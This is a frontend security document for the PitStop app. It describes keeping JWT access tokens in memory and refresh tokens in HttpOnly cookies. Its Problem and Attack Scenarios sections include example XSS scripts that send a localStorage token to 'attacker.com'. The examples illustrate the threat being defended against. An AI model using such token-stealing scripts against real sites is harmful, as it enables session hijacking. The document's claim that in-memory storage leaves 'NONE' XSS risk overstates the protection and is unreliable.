# Security Implementation - PitStop Frontend

**Last Updated:** 2025-12-21
**Status:** ✅ Production-Ready

## Overview

This document describes the security measures implemented in the PitStop frontend to protect against common web vulnerabilities, particularly **Cross-Site Scripting (XSS)** attacks.

---

## 🔐 Token Security (XSS Prevention)

### Problem

Storing JWT access tokens in `localStorage` makes them vulnerable to XSS attacks:

```javascript
// ❌ VULNERABLE
localStorage.setItem('access_token', token);
```

If an attacker injects malicious JavaScript (via XSS vulnerability), they can:
```javascript
// Attacker's script
const stolenToken = localStorage.getItem('access_token');
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: stolenToken
});
```

### Solution Implemented

**Two-Token Strategy:**

1. **Access Token** (short-lived, 15 minutes)
   - ✅ Stored **ONLY in memory** (JavaScript variable)
   - ✅ Lost on page refresh/tab close
   - ✅ Cannot be accessed by XSS (not in DOM storage)

2. **Refresh Token** (long-lived, 7 days)
   - ✅ Stored in **HttpOnly cookie** (managed by backend)
   - ✅ Inaccessible to JavaScript (HttpOnly flag)
   - ✅ Sent automatically with requests (Secure, SameSite flags)

### Implementation Details

#### 1. Token Storage (`src/shared/services/api.ts`)

```typescript
/**
 * SECURITY: Token management in memory only
 *
 * Access token is stored ONLY in memory (this variable) to prevent XSS attacks.
 * Refresh token is stored in HttpOnly cookie (managed by backend) to prevent XSS.
 */
let accessToken: string | null = null;

export const setAccessToken = (token: string | null) => {
  accessToken = token; // Memory only - no localStorage
};

export const getAccessToken = () => accessToken;
```

**Key Changes:**
- ❌ Removed `localStorage.setItem()` for access token
- ❌ Removed `localStorage.getItem()` for access token
- ✅ Token exists only in memory during session

#### 2. Auto-Authentication (`src/features/auth/store/authSlice.ts`)

On app initialization, we attempt to restore the session using the refresh token:

```typescript
export const initializeAuth = createAsyncThunk(
  'auth/initialize',
  async (_, { rejectWithValue }) => {
    try {
      // Try to refresh access token using the HttpOnly cookie
      await authService.refreshToken();

      // Successfully refreshed, now fetch user profile
      const user = await authService.getCurrentUser();

      return user;
    } catch (error: any) {
      // Refresh token is invalid, expired, or doesn't exist
      return rejectWithValue(error.message || 'Sessão expirada');
    }
  }
);
```

**Flow:**
1. User refreshes page → access token lost (in memory)
2. App calls `/auth/refresh` with refresh token cookie
3. Backend validates refresh token, returns new access token
4. App fetches user profile with new access token
5. Session restored ✅

#### 3. Login Flow (`src/features/auth/services/authService.ts`)

```typescript
async login(credentials: LoginRequest): Promise<LoginResponse> {
  const response = await api.post<LoginResponse>(
    '/auth/login',
    credentials,
    {
      withCredentials: true, // ✅ Send/receive cookies for refresh token
    }
  );

  const loginData = response.data;

  // Store access token in memory (not localStorage)
  setAccessToken(loginData.accessToken);

  return loginData;
}
```

**Backend Requirements:**
```java
// Backend must set HttpOnly cookie
response.addCookie(new Cookie("refreshToken", token) {{
    setHttpOnly(true);  // ✅ Inaccessible to JavaScript
    setSecure(true);    // ✅ HTTPS only
    setSameSite("Strict"); // ✅ CSRF protection
    setMaxAge(7 * 24 * 60 * 60); // 7 days
}});
```

#### 4. Token Refresh Flow (`src/shared/services/api.ts`)

Automatic token refresh on 401 Unauthorized:

```typescript
api.interceptors.response.use(
  (response) => response,
  async (error: AxiosError<ApiError>) => {
    if (error.response?.status === 401 && !originalRequest._retry) {
      try {
        // Refresh token using HttpOnly cookie
        const refreshResponse = await api.post<{ accessToken: string }>(
          '/auth/refresh',
          {},
          {
            withCredentials: true, // ✅ Send refresh token cookie
          }
        );

        const newToken = refreshResponse.data.accessToken;
        setAccessToken(newToken);

        // Retry original request with new token
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return api(originalRequest);
      } catch (refreshError) {
        // Refresh failed, clear session and redirect to login
        setAccessToken(null);
        window.location.href = '/login';
      }
    }
    return Promise.reject(error);
  }
);
```

---

## 📋 User Data Persistence

### What We Store in localStorage

```typescript
// ✅ SAFE to store (non-sensitive, public data)
localStorage.setItem('pitstop_user', JSON.stringify({
  id: '123',
  nome: 'João Silva',
  email: 'joao@example.com',
  perfil: 'ADMIN'
}));

localStorage.setItem('pitstop_remember_me', 'true');
```

**Why it's safe:**
- ❌ **NO** passwords
- ❌ **NO** access tokens
- ❌ **NO** refresh tokens
- ✅ Only public profile data (for UX convenience)

**Purpose:**
- Show user name/avatar without API call
- Faster initial render
- "Remember Me" functionality

---

## 🛡️ Security Trade-offs

### Before (Vulnerable)

| Feature | Status | Risk |
|---------|--------|------|
| Access token in localStorage | ❌ | **HIGH** - XSS can steal token |
| Session persists on refresh | ✅ | N/A |
| Auto-login after refresh | ✅ | N/A |

### After (Secure)

| Feature | Status | Risk |
|---------|--------|------|
| Access token in memory | ✅ | **NONE** - XSS cannot access |
| Session persists on refresh | ✅ | Via refresh token |
| Auto-login after refresh | ✅ | Seamless with refresh token |

**Trade-off:**
- ❌ Access token lost on page refresh
- ✅ **BUT** automatically restored via refresh token (transparent to user)

---

## 🔍 Attack Scenarios

### Scenario 1: XSS Attack

**Before (Vulnerable):**
```javascript
// Attacker injects this script
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('pitstop_access_token')
  });
</script>
// ❌ Token stolen → Attacker has full access
```

**After (Protected):**
```javascript
// Attacker injects same script
<script>
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: localStorage.getItem('pitstop_access_token') // null
  });
</script>
// ✅ Token is in memory, not accessible → Attack fails
```

### Scenario 2: Session Hijacking

**Before (Vulnerable):**
- Attacker steals token from localStorage
- Token valid for 15 minutes
- Attacker can make requests as the user

**After (Protected):**
- Attacker cannot access token (in memory)
- Refresh token in HttpOnly cookie (inaccessible to JS)
- Even if attacker finds another vulnerability, impact minimized

---

## ✅ Security Checklist

- [x] Access token stored in memory only
- [x] Refresh token in HttpOnly cookie
- [x] Automatic token refresh on app init
- [x] Request queue during token refresh
- [x] Token cleared on logout
- [x] HTTPS enforced (production)
- [x] SameSite cookie attribute (CSRF protection)
- [x] Secure cookie attribute (HTTPS only)
- [x] Short-lived access token (15 min)
- [x] Long-lived refresh token (7 days)

---

## 🚀 Testing

### Manual Test: Token Security

1. **Login**
   ```bash
   # Login via UI
   # Check DevTools > Application > Local Storage
   # ✅ Should NOT see 'pitstop_access_token'
   # ✅ Should only see 'pitstop_user' (if Remember Me checked)
   ```

2. **Page Refresh**
   ```bash
   # Refresh page (F5)
   # ✅ Should remain logged in (auto-refresh)
   # ✅ Check Network > /auth/refresh request
   ```

3. **Logout**
   ```bash
   # Click logout
   # Check DevTools > Application > Cookies
   # ✅ Refresh token cookie should be cleared
   ```

### Automated Test (TODO)

```typescript
// src/features/auth/__tests__/tokenSecurity.test.ts
describe('Token Security', () => {
  it('should NOT store access token in localStorage', () => {
    // Login
    // Assert: localStorage.getItem('pitstop_access_token') === null
  });

  it('should restore session on refresh using refresh token', () => {
    // Mock refresh token cookie
    // Call initializeAuth()
    // Assert: user authenticated
  });
});
```

---

## 📚 References

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [RFC 6749: OAuth 2.0 (Refresh Tokens)](https://datatracker.ietf.org/doc/html/rfc6749#section-1.5)
- [MDN: HttpOnly Cookie Flag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)
- [Auth0: Token Storage Best Practices](https://auth0.com/docs/secure/security-guidance/data-security/token-storage)

---

## 🔄 Migration Guide

If you're upgrading from the old implementation:

1. **Clear existing tokens:**
   ```javascript
   localStorage.removeItem('pitstop_access_token');
   ```

2. **No code changes required for users:**
   - Auto-authentication handles everything
   - Login flow remains the same
   - User experience unchanged

3. **Backend must support:**
   - `POST /auth/refresh` endpoint
   - HttpOnly cookie for refresh token
   - Cookie attributes: `HttpOnly`, `Secure`, `SameSite=Strict`

---

## 📞 Support

For security concerns or questions:
- **Email:** security@pitstop.com (hypothetical)
- **Docs:** See `CLAUDE.md` for development guidelines
- **Slack:** #security channel (hypothetical)

---

**Last Security Audit:** 2025-12-21
**Next Audit Due:** Q2 2026
